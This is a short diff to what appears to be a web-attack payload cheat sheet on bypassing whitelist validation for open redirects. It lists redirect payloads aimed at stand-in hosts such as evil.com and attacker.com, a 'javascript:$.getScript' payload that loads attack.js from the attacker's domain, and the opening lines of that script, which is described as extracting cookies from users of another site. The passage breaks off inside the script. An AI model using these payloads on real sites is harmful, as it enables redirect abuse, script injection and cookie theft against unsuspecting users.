@@ -277,9 +277,9 @@ Bypass white list validation
  http://example.com/example.php?url=http://malicious.example.com
  ?next= javascript:$.getScript`https://my_own_domain/attack.js`
  https://victim.com/?next= javascript:$.getScript`https://my_own_domain/attack.js`
- 1: ?returnto=http://evil.com ❌
+1: ?returnto=http://evil.com ❌
 2: ?returnto=/\/\/\http://evil.com ✅
-
+3: 2redirect=http%3a//google.com///attacker.com
  attack.js file which will be on my site to extract cookies from user in the other site 
  if(location.host == “my_own_domain”){ 
     Url = new URL(document.location); 
